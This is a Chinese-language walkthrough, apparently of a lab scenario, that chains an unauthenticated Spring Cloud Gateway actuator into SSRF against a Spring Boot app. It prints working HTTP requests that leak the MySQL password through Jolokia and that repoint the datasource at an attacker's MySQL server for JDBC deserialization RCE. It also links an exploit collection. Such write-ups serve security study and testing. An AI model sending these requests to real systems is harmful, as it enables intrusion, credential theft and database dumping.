## 概述

外网有俩服务，第一个是Springboot写的web服务，`/actuator`路由加了Springboot Security限制了内网IP白名单，攻击者没办法直接访问，只能访问正常的业务

第二个是SpringCloud Gateway，也有`/actuator`路由，而且是未授权访问。可以访问`/actuator/gateway/routes`获取到gateway转发的地址，从而访问`/oasystem`打第一个web服务的SSRF

通过SSRF第一个web服务的`/actuator`，一可以打MySQL JDBC 反序列化（不单单是这个，还有其他手法RCE）直接RCE，二可以打`/actuator/jolokia`，造成数据库密码泄露
RCE之后可以直接拿数据库密码连接MySQL托库

![](../images/oasystem.png)

## API interface leak  &&  SSRF

扫Gateway服务的目录得到`/actuator`未授权访问，以及转发流量的路由

![](../images/oasystem_2.png)

## MySQL passwd leak

获取env，寻找`*`加密的密码

![](../images/oasystem_3.png)

获取*加密的密码

```http
POST /oasystem/actuator/jolokia HTTP/1.1
Content-Type: application/json
Host: localhost:8000
Connection: close
Content-Length: 205

{
    "mbean": "org.springframework.boot:name=SpringApplication,type=Admin",
    "operation": "getProperty",
    "type": "EXEC",
    "arguments": [
        "spring.datasource.password"
    ]
}
```

## MySQL JDBC deserialization to RCE

修改配置，指向恶意MySQL服务器

```http
POST /oasystem/actuator/env HTTP/1.1
Content-Type: application/json
Host: localhost:8000
Content-Length: 215

{"name":"spring.datasource.url","value":"jdbc:mysql://IP:PORT/mysql?characterEncoding=utf8&useSSL=false&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&autoDeserialize=true"}
```

刷新配置

```http
POST /oasystem/actuator/refresh HTTP/1.1
Host: localhost:8000
Content-Length: 0


```

用户操作，触发SQL查询，RCE。

更多攻击手法请见：https://github.com/LandGrey/SpringBootVulExploit

